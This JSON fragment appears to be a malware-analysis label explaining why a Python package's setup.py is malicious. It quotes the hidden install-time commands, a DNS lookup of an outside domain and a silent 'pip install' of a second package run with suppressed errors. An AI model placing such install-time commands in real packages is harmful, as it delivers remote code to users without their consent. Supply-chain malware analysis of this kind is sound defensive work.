      "malicious_behavior": "The code executes shell commands during the package setup process without user interaction or consent, which is a known supply chain attack vector. Specifically, it runs 'dig @1.1.1.1 install.api.pygrata.com' and 'pip install pygrata-utils -U' via subprocess.getoutput inside a try-except block that suppresses all exceptions, hiding any failures. This behavior is suspicious because it performs network operations and installs or upgrades a package dynamically during installation, potentially allowing arbitrary code execution or further payload delivery. The use of subprocess calls in setup.py without validation or user notification, combined with silent exception handling, aligns with typical malicious patterns seen in malware that abuse installation scripts for remote code execution and persistence. The domain 'install.api.pygrata.com' and the package 'pygrata-utils' are not standard or widely recognized, increasing suspicion. Therefore, this code exhibits malicious behavior consistent with supply chain attacks and unauthorized code execution during package installation."
